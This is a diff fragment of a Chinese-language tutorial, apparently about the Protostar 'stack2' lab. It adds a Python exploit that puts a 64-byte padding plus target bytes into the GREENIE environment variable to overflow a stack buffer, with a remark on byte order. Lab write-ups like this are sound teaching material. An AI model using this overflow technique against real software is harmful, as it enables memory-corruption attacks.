@@ -64,6 +64,20 @@ argv
 
 用python构造利用代码 exploit.py
 
+ import os
+
+ def main\(\):
+
+     envval = 'A'\*64 + '\x0a\x0d\x0a\x0d'
+
+     os.putenv\("GREENIE", envval\)
+
+     os.system\("./stack2"\)
+
+ if \_\_name\_\_ == "\_\_main\_\_":
+
+     main\(\)
+
 注意地址的顺序和字节在内存中的顺序正好相反。
 
 ![](/png/10.png)
